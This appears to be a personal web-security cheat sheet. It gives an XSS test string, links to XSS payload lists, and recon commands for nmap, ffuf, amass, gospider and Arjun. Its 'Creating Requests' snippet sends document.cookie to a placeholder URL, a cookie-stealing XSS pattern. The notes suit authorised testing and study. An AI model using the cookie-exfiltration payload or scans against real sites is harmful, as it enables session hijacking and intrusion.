# Javascript Breakdown Requests

### Javascript
```
document.getElementById
document.getElementByClassName
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagNameNS

var variablename document.getElementByIdTagName("tagName").innerHTML = "-confirm(1)-"
var variablename document.getElementsByIdTagName("tagName")[0].innerHTML = "-confirm(1)-"
```

### Creating Requests
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'URL' + document.cookie, true);
xhttp.send();
```

Thanks to @Legacyy for assisting me with the javascript breakdown

### XSS
Resources:

https://joecmarshall.com/posts/burp-suite-extensions-xss-validator/

https://portswigger.net/support/xss-beating-html-sanitizing-filters

https://xsshunter.com/app

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### XSS Payloads
https://github.com/payloadbox/xss-payload-list

https://github.com/pgaijin66/XSS-Payloads


## Port scanning web server
```
nmap -sC -sV -v -p- IP
nmap -sC -sV -v -p- IP --min-rate=10000
```

## Fuzzing Websites
https://github.com/ffuf/ffuf

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302

To filter by size
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302 -fs 1000
```
### Fuzzing Resources
https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt

## Subdomain Scraping
https://github.com/OWASP/Amass
```
amass enum -v -src -ip -brute -min-for-recursive 2 -o domain_list.txt -d $domain
```

### Cleaning domain list (thanks to @dee-see) for assisting on this!
```
awk '{print $2}' $1
```

### Probing domains
https://github.com/tomnomnom/httprobe
```
cat domain_list | httprobe > http_domain_list
```

### Screenshots
https://github.com/FortyNorthSecurity/EyeWitness
```
python3 /path/to/EyeWitness.py -f $1
```

### Web Crawling
https://github.com/jaeles-project/gospider

https://github.com/hakluke/hakrawler

```
gospider -S domain_list.txt --depth 2 --no-redirect -t 50 -c 3 -o gospiderdump
```

### Fuzzing Params
https://github.com/s0md3v/Arjun

https://github.com/maK-/parameth

```
arjun.py -u $url -t 10 --get --post
```

### Domain History
https://github.com/tomnomnom/waybackurls

### findings new domains using amass
https://danielmiessler.com/study/amass/

```
amass intel -ip -cidr $1
```
